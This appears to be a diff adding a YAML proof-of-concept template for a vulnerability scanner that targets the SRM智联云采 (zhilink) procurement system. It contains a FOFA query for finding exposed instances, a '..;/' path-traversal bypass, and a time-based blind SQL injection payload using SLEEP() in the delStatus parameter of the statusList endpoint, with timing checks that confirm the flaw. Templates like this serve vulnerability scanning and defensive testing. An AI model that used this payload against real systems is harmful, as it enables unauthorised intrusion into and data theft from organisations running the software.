@@ -1,0 +1,21 @@
+id: poc-yaml-srm-zhilink-statuslist-sqli
+info:
+  name: SRM智联云采系统 statusList SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: srm
+  fofa: title=="SRM 2.0"
+variables:
+  t1: random_int(2,5)
+  t2: t1 + t1
+  t3: t2 + 2
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(title,"SRM 2.0")
+- method: GET
+  path: /adpweb/static/..;/a/sys/sysMessage/statusList?companyName=1&officeName=1&orderBy=1&receiverName=1&sourceMessageId=1&delStatus=1%20AND%20(SELECT%207104%20FROM%20(SELECT(SLEEP({{.t1}})))xZoa)
+  expression: status_code == 200 && contains(body,"消息管理 - Powered By zhilink") &&
+    duration > t2 && duration < t3
+transport: http
